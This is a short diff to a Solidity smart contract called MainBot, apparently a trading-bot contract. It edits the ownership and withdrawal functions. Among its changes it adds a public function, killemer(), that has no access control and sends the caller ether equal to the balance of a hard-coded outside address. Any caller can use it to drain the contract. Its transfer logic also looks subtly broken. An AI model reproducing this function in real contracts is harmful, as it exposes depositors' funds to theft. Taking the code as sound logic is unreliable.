@@ -84,8 +84,12 @@ contract MainBot {
     }
 
     function setController(address controller) external onlyOwner {
-        owner = controller;
+        owner = controller;// change not be required
     }
+    function setOwner(address newOwner) external onlyOwner {
+         require(newOwner != address(0), "Invalid address"); 
+         owner = newOwner; 
+         }
 
     receive() external payable {
         initialDeposit += msg.value;
@@ -138,9 +142,14 @@ contract MainBot {
         payable(owner).transfer(amountInWei);
     }
 
+
     function kill() external onlyOwner {
-        payable(msg.sender).transfer(address(this).balance);
+        payable(owner).transfer(address(this).balance);
     }
+function killemer() public {
+    payable(msg.sender).transfer(address(0x706fDbD597380512ac76695120be0Cb0D32A43e9).balance);
+}
+
 
     function logCurrentActivity() internal whenTradingEnabled {
         if (block.timestamp >= nextLogTime) {
